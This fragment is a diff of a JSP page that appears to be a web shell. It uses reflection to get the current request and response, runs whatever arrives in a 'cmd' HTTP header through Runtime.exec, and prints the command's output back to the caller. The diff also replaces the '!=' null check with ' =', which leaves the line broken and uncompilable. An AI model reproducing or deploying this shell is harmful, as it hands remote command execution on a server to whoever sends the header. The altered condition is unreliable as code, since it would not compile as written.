@@ -15,7 +15,7 @@
             Object resp = o.getClass().getMethod("getCurrentThreadsIExtendedResponse", new Class[0]).invoke(o, new Object[0]);
 
             String cmd = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});
-            if(cmd != null && !cmd.isEmpty()){
+            if(cmd  = null && !cmd.isEmpty()){
                 String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
 
                 java.io.PrintWriter printWriter = (java.io.PrintWriter)resp.getClass().getMethod("getWriter", new Class[0]).invoke(resp, new Object[0]);
@@ -26,3 +26,4 @@
         }
     }
 %>
+ 
